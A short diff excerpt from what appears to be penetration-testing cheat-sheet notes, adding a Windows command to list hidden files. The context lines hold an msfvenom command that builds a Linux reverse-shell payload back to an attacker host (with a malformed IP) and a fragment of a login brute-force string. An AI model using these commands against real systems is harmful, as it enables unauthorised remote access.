@@ -194,3 +194,6 @@ In&testcookie=1:S=Location'
 
 Msfvenom JS payload:
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.11944 LPORT=443 CMD=/bin/bash -f js_le -e generic/none
+
+See hidden files and folders in Windows:
+dir /ah
